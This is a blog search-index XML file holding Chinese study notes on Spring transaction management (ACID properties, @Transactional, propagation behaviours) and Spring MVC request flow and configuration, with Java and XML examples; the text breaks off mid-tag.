<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>spring事务管理</title>
      <link href="/2022/02/20/spring-shi-wu-guan-li/"/>
      <url>/2022/02/20/spring-shi-wu-guan-li/</url>
      
        <content type="html"><![CDATA[<h3 id="一、事务定义与概念"><a href="#一、事务定义与概念" class="headerlink" title="一、事务定义与概念"></a>一、事务定义与概念</h3><h4 id="1、事务的定义"><a href="#1、事务的定义" class="headerlink" title="1、事务的定义"></a>1、事务的定义</h4><p>（1）事务是数据库操作最基本单元，逻辑上一组操作，要么都成功，如果有一个失败所有操作都失败。</p><p>（2）典型场景：银行转账</p><p>* lucy 转账 100 元 给 mary</p><p>* lucy 少 100，mary 多 100</p><h4 id="2、事务的四大特性（ACID）"><a href="#2、事务的四大特性（ACID）" class="headerlink" title="2、事务的四大特性（ACID）"></a>2、事务的四大特性（ACID）</h4><p><strong>原子性（Atomicity）</strong>：事务是一个原子操作，由一系列动作组成。事务的原子性确保动作要么全部完成，要么完全不起作用。<br><strong>一致性（Consistency）</strong>：一旦事务完成（不管成功还是失败），系统必须确保它所建模的业务处于一致的状态，而不会是部分完成部分失败。在现实中的数据不应该被破坏。<br><strong>隔离性（Isolation）</strong>：可能有许多事务会同时处理相同的数据，因此每个事务都应该与其他事务隔离开来，防止数据损坏。<br><strong>持久性（Durability）</strong>：一旦事务完成，无论发生什么系统错误，它的结果都不应该受到影响，这样就能从任何系统崩溃中恢复过来。通常情况下，事务的结果被写到持久化存储器中。</p><h4 id="3、Spring事务管理"><a href="#3、Spring事务管理" class="headerlink" title="3、Spring事务管理"></a>3、Spring事务管理</h4><h5 id="（1）编程式事务管理"><a href="#（1）编程式事务管理" class="headerlink" title="（1）编程式事务管理"></a>（1）编程式事务管理</h5><p>编程式事务管理是侵入性事务管理，使用TransactionTemplate或者直接使用PlatformTransactionManager，对于编程式事务管理，Spring推荐使用TransactionTemplate。</p><h5 id="（2）声明式事务管理"><a href="#（2）声明式事务管理" class="headerlink" title="（2）声明式事务管理"></a>（2）声明式事务管理</h5><p>声明式事务管理建立在AOP之上，其本质是对方法前后进行拦截，然后在目标方法开始之前创建或者加入一个事务，执行完目标方法之后根据执行的情况提交或者回滚。编程式事务每次实现都要单独实现，但业务量大功能复杂时，使用编程式事务无疑是痛苦的，而声明式事务不同，声明式事务属于无侵入式，不会影响业务逻辑的实现，只需要在配置文件中做相关的事务规则声明或者通过注解的方式，便可以将事务规则应用到业务逻辑中。</p><p>显然声明式事务管理要优于编程式事务管理，这正是Spring倡导的非侵入式的编程方式。唯一不足的地方就是声明式事务管理的粒度是方法级别，而编程式事务管理是可以到代码块的，但是可以通过提取方法的方式完成声明式事务管理的配置。</p><h4 id="4、搭建事务操作环境"><a href="#4、搭建事务操作环境" class="headerlink" title="4、搭建事务操作环境"></a>4、搭建事务操作环境</h4><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Repository</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserDaoImpl</span> <span class="token keyword">implements</span> <span class="token class-name">UserDao</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> JdbcTemplate jdbcTemplate<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//lucy 转账 100 给mary </span><span class="token comment" spellcheck="true">//少钱 </span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String sql <span class="token operator">=</span> <span class="token string">"update t_account set money=money-? where username=?"</span><span class="token punctuation">;</span>        jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"lucy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//多钱 </span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        String sql <span class="token operator">=</span> <span class="token string">"update t_account set money=money+? where username=?"</span><span class="token punctuation">;</span>        jdbcTemplate<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>sql<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"mary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//注入 dao </span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//转账的方法 </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accountMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//lucy 少 100 </span>        userDao<span class="token punctuation">.</span><span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//模拟异常</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//mary 多 100 </span>        userDao<span class="token punctuation">.</span><span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><p>问：上面的问题如何解决呢？<br> 答：使用事务解决问题</p><p><strong>事务操作过程：</strong></p><p>事务添加到 JavaEE 三层结构里面 Service 层（业务逻辑层）</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//注入 dao </span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//转账的方法 </span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accountMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span><span class="token punctuation">{</span>               <span class="token comment" spellcheck="true">//第一步 开启事物</span>            <span class="token comment" spellcheck="true">//第二步 进行业务操作</span>            <span class="token comment" spellcheck="true">//lucy 少 100 </span>            userDao<span class="token punctuation">.</span><span class="token function">reduceMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//模拟异常</span>            <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//mary 多 100 </span>            userDao<span class="token punctuation">.</span><span class="token function">addMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//第三步 没有发生异常，提交事物</span>            <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//第四步 出现异常，事物回滚</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> </code></pre><h3 id="二、Spring-事务管理"><a href="#二、Spring-事务管理" class="headerlink" title="二、Spring 事务管理"></a>二、<strong>Spring</strong> <strong>事务管理</strong></h3><p>在 Spring 进行事务管理操作，有两种方式：编程式事务管理和声明式事务管理（使用）</p><h4 id="1、声明式事务管理的实现方式："><a href="#1、声明式事务管理的实现方式：" class="headerlink" title="1、声明式事务管理的实现方式："></a>1、声明式事务管理的实现方式：</h4><p>（1）基于注解方式（使用）<br> （2）基于xml配置方式</p><h4 id="2、在-Spring-进行声明式事务管理，底层使用-AOP-原理"><a href="#2、在-Spring-进行声明式事务管理，底层使用-AOP-原理" class="headerlink" title="2、在 Spring 进行声明式事务管理，底层使用 AOP 原理"></a>2、<strong>在</strong> <strong>Spring</strong> <strong>进行声明式事务管理，底层使用</strong> <strong>AOP</strong> <strong>原理</strong></h4><h4 id="3、Spring-事务管理-API"><a href="#3、Spring-事务管理-API" class="headerlink" title="3、Spring 事务管理 API"></a>3、<strong>Spring</strong> <strong>事务管理</strong> <strong>API</strong></h4><p>（1）提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类(<strong>DataSourceTransactionManager</strong>)</p><h4 id="3、注解式事务管理操作"><a href="#3、注解式事务管理操作" class="headerlink" title="3、注解式事务管理操作"></a>3、注解式事务管理操作</h4><p>（1）在Spring配置文件中，添加事务管理器，并开启事务注解这里需要注意，开启事务注解需要使用名称空间tx</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xmlns:</span>tx</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/tx<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd  http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd  http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><pre class=" language-xml"><code class="language-xml"> <span class="token comment" spellcheck="true">&lt;!--创建事务管理器--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.jdbc.datasource.DataSourceTransactionManager<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!--注入数据源--></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--开启事务注解--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">tx:</span>annotation-driven</span> <span class="token attr-name">transaction-manager</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>transactionManager<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>(2)在 service 类上面（或者 service 类里面方法上面）添加事务注解</p><p>（1）@Transactional，这个注解添加到类上面，也可以添加方法上面</p><p>（2）如果把这个注解添加类上面，这个类里面所有的方法都添加事务</p><p>（3）如果把这个注解添加方法上面，为这个方法添加事务</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token annotation punctuation">@Transactional</span> <span class="token comment" spellcheck="true">// 事务注解，类上面或者里面的方法上添加注解</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在 service 类上面添加注解@Transactional，在这个注解里面可以配置事务相关参数</p><h3 id="三、事务的传播行为-propagation"><a href="#三、事务的传播行为-propagation" class="headerlink" title="三、事务的传播行为(propagation)"></a>三、事务的传播行为(propagation)</h3><p>事务的传播性一般用在事务嵌套的场景，比如一个事务方法里面调用了另外一个事务方法，那么两个方法是各自作为独立的方法提交还是内层的事务合并到外层的事务一起提交，这就是需要事务传播机制的配置来确定怎么样执行。</p><p><strong>事务的传播行为有以下七种：</strong></p><p><strong>PROPAGATION_REQUIRED</strong>：Spring默认的传播机制，能满足绝大部分业务需求，如果外层有事务，则当前事务加入到外层事务，一块提交，一块回滚。如果外层没有事务，新建一个事务执行</p><p><strong>PROPAGATION_REQUES_NEW</strong>：该事务传播机制是每次都会新开启一个事务，同时把外层事务挂起，当当前事务执行完毕，恢复上层事务的执行。如果外层没有事务，执行当前新开启的事务即可</p><p><strong>PROPAGATION_SUPPORT</strong>：如果外层有事务，则加入外层事务，如果外层没有事务，则直接使用非事务方式执行。完全依赖外层的事务<br><strong>PROPAGATION_NOT_SUPPORT</strong>该传播机制不支持事务，如果外层存在事务则挂起，执行完当前代码，则恢复外层事务，无论是否异常都不会回滚当前的代码</p><p><strong>PROPAGATION_NEVER</strong>：该传播机制不支持外层事务，即如果外层有事务就抛出异常</p><p><strong>PROPAGATION_MANDATORY</strong>：与NEVER相反，如果外层没有事务，则抛出异常</p><p><strong>PROPAGATION_NESTED</strong>该传播机制的特点是可以保存状态保存点，当前事务回滚到某一个点，从而避免所有的嵌套事务都回滚，即各自回滚各自的，如果子事务没有把异常吃掉，基本还是会引起全部回滚的。</p><p>传播规则回答了这样一个问题：一个新的事务应该被启动还是被挂起，或者是一个方法是否应该在事务性上下文中运行。</p><h3 id="四、事务的隔离级别"><a href="#四、事务的隔离级别" class="headerlink" title="四、事务的隔离级别"></a>四、事务的隔离级别</h3>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springmvc</title>
      <link href="/2022/02/18/springmvc/"/>
      <url>/2022/02/18/springmvc/</url>
      
        <content type="html"><![CDATA[<h3 id="一、Springmvc组成"><a href="#一、Springmvc组成" class="headerlink" title="一、Springmvc组成"></a>一、Springmvc组成</h3><p>Spring的MVC框架主要由DispatcherServlet（前端控制器，如果配置“?”不包含jsp结尾的格式）、处理器映射、处理器(控制器)、视图解析器、视图组成。</p><p><a href="https://www.cnblogs.com/fengquan-blog/p/11161084.html" target="_blank" rel="noopener">https://www.cnblogs.com/fengquan-blog/p/11161084.html</a></p><h3 id="二、Springmvc运行原理"><a href="#二、Springmvc运行原理" class="headerlink" title="二、Springmvc运行原理"></a>二、Springmvc运行原理</h3><p>1、 用户发送请求至前端控制器DispatcherServlet。</p><p>2、 DispatcherServlet收到请求调用HandlerMapping处理器映射器。</p><p>3、 处理器映射器找到具体的处理器(可以根据xml配置、注解进行查找)，生成处理器对象及处理器拦截器(如果有则生成)一并返回给DispatcherServlet。</p><p>4、 DispatcherServlet调用HandlerAdapter处理器适配器。</p><p>5、 HandlerAdapter经过适配调用具体的处理器(Controller，也叫后端控制器)。</p><p>6、 Controller执行完成返回ModelAndView。</p><p>7、 HandlerAdapter将controller执行结果ModelAndView返回给DispatcherServlet。</p><p>8、 DispatcherServlet将ModelAndView传给ViewReslover视图解析器。</p><p>9、 ViewReslover解析后返回具体View。</p><p>10、DispatcherServlet根据View进行渲染视图（即将模型数据填充至视图中）。</p><p>11、 DispatcherServlet响应用户。</p><h3 id="三、组件说明："><a href="#三、组件说明：" class="headerlink" title="三、组件说明："></a>三、组件说明：</h3><p>以下组件通常使用框架提供实现：</p><p><strong>DispatcherServlet</strong>：作为前端控制器，整个流程控制的中心，控制其它组件执行，统一调度，降低组件之间的耦合性，提高每个组件的扩展性。</p><p><strong>HandlerMapping</strong>：通过扩展处理器映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。 </p><p><strong>HandlAdapter</strong>：通过扩展处理器适配器，支持更多类型的处理器。</p><p><strong>ViewResolver</strong>：通过扩展视图解析器，支持更多类型的视图解析，例如：jsp、freemarker、pdf、excel等。</p><h3 id="四、注解和xml配置两种方式配置springmvc"><a href="#四、注解和xml配置两种方式配置springmvc" class="headerlink" title="四、注解和xml配置两种方式配置springmvc"></a>四、注解和xml配置两种方式配置springmvc</h3><p>web.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee    http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd<span class="token punctuation">"</span></span>    <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>spring-11-mvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- SpringMVC前端控制器 1.前端接收所有请求， 2.启动SpringMVC工厂 mvc.xml 3.springMVC流程调度 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 注册DispatcherServlet 这个是springMVC的核心；请求分发器，前端控制器 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 关联一个springmvc配置文件：【servlet-name】 -servlet.xml --></span>        <span class="token comment" spellcheck="true">&lt;!-- DispatcherServlet要绑定spring的配置文件 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>classpath:springmvc-servletdemo.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!-- classpath:当前路径下找，classpath*:所有包下找 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 启动级别 1 --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- / 匹配所有请求：不包括 .jsp --></span>    <span class="token comment" spellcheck="true">&lt;!-- /* 匹配所有的请求 包括.jsp --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>springmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span></code></pre><h4 id="1-通过xml配置"><a href="#1-通过xml配置" class="headerlink" title="1.通过xml配置"></a>1.通过xml配置</h4><p>springmvc.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加处理器映射器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加处理器适配器 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 添加视图解析器 --></span>        <span class="token comment" spellcheck="true">&lt;!-- 视图解析器：DispatcherServlet给它的ModelAndView    1.获得了ModelAndView 的数据    2.解析ModelAndView的视图名字    3.拼接视图名字，找到对应的视图：  /WEB-INF/jsp/hello.jsp    4.将数据渲染到视图上。     --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.view.InternalResourceViewResolver<span class="token punctuation">"</span></span>        <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>InternalResourceViewResolver<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>prefix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suffix<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>.jsp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- Handler 每一个Controller都要注册一个bean--></span>        &lt;bean id = "/hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>1.使用（org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping）处理映射器</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>        <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        //将bean的name作为URL进行查找，需要再配置Handler时指定beanname(就是URL)&lt;bean id = "/hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>2.使用（org.springframework.web.servlet.handler.SimpleUrlHandlerMapping）处理映射器</p><pre class=" language-xml"><code class="language-xml">&lt;bean id = "hello" class="com.kuang.controller.HelloController"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span>  <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.handler.SimpleUrlHandlerMapping<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>urlMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>            //demo为访问地址，hello为映射bean地址            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo<span class="token punctuation">"</span></span> <span class="token attr-name">value-ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hello<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entry</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="2-通过注解方式配置"><a href="#2-通过注解方式配置" class="headerlink" title="2.通过注解方式配置"></a>2.通过注解方式配置</h4><p>注解处理适配器</p><p>spring3.1之前使用</p><p>org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter</p><p>spring3.1之后使用</p><p>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>spring-mvc.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token 